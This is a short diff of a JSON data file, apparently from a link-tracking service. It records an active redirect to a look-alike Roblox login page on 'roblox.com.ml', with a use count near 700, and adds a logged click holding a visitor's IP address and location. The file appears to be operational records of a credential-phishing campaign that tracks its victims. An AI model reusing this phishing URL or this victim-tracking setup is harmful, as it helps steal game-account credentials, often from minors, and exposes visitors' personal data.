@@ -110,7 +110,7 @@
     "targetUrl": "https://www.roblox.com.ml/NewLogin?returnUrl=https%3A%2F%2Fwww.roblox.com%2Fcommunities%2F296844474575%2FKeyPermanent",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 697,
+    "useCount": 698,
     "createdBy": "admin",
     "clicks": [
       {
@@ -5688,6 +5688,14 @@
         "city": "Germiston",
         "flag": "🇿🇦",
         "countryCode": "ZA"
+      },
+      {
+        "timestamp": 1777133338179,
+        "ip": "88.175.193.199",
+        "country": "France",
+        "city": "Paris",
+        "flag": "🇫🇷",
+        "countryCode": "FR"
       }
     ]
   },
